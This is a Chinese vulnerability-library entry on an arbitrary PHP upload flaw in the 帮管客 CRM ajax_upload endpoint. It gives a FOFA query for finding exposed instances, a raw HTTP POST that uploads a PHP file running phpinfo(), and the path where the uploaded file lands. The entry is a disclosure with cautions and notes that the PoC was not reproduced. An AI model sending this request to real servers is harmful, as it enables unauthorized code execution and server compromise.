---
source: "wy876 漏洞文库"
title: "帮管客CRM ajax_upload任意PHP上传"
product: "帮管客CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP执行条件"
prerequisites: "无Cookie示例，匿名声称"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gx3kacfb8q9w0bdb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRM/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRMajax_upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"帮管客-CRM\""
id: "vw-53f6f369b9c39bc11ff754d0"
entity_id: "ve-53f6f369b9c39bc11ff754d0"
schema_version: "1"
---

# 帮管客CRM ajax_upload任意PHP上传

## 条目说明

- 对象与具体问题：帮管客CRM；ajax_upload任意PHP上传
- 版本、配置及部署条件：版本未知；PHP执行条件
- 认证与权限前提：无Cookie示例，匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只给随机路径无响应/执行结果；自删仍可能残留失败文件或覆盖风险
- //data路径表示需规范，缺修复和版本证据

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。帮管客CRM客户管理系统，客户管理，从未如此简单，一个平台满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化.帮管客CRM ajax_upload_chat、ajax_upload等接口处存在文件上传漏洞，未经授权的攻击者可利用该漏洞获取服务器权限。

## 二、影响版本
+ 帮管客CRM

## 三、资产测绘
+ fofa`app="帮管客-CRM"`
+ 特征


## 四、漏洞复现
```http
POST /index.php/upload/ajax_upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o

------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--
```


上传文件位置

```plain
//data//uploads//202401//202401311642767GFUPHdsA.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gx3kacfb8q9w0bdb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
